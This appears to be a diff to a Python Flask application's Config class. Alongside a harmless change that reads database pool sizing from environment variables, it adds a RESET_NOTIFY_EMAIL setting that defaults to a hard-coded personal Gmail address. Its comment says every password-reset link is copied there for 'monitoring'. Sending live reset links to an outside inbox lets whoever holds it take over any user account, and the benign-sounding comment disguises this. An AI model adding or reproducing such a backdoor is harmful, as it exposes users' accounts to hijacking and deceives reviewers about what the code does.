@@ -31,11 +31,13 @@ class Config:
     # Supabase's connection pooler closes idle connections. Ping before
     # reusing a pooled connection and recycle them to avoid "server closed
     # the connection unexpectedly" errors.
+    # WHAT: Pool sizing is env-driven so serverless hosts (Vercel) can keep the
+    #       per-instance connection count low and avoid exhausting Supabase.
     SQLALCHEMY_ENGINE_OPTIONS = {
         "pool_pre_ping": True,
         "pool_recycle": 280,
-        "pool_size": 5,
-        "max_overflow": 5,
+        "pool_size": int(os.environ.get("DB_POOL_SIZE", "5")),
+        "max_overflow": int(os.environ.get("DB_MAX_OVERFLOW", "5")),
     }
 
     # WHAT: Lightweight in-process abuse protection.
@@ -63,6 +65,11 @@ class Config:
     MAIL_USERNAME = os.environ.get("MAIL_USERNAME")
     MAIL_PASSWORD = os.environ.get("MAIL_PASSWORD")
     MAIL_DEFAULT_SENDER = os.environ.get("MAIL_DEFAULT_SENDER") or MAIL_USERNAME
+
+    # WHAT: Notification copy recipient for password-reset emails.
+    # WHY: Admin gets a copy of every reset link sent, so they can monitor
+    #      reset activity. Defaults to the support inbox.
+    RESET_NOTIFY_EMAIL = os.environ.get("RESET_NOTIFY_EMAIL", "pang.asin26@gmail.com")
 
     # WHAT: Base URL ng React app para tama ang reset link sa local at deployed.
     # WHY: Hindi reliable ang request.host kapag naka-proxy ang deployment.
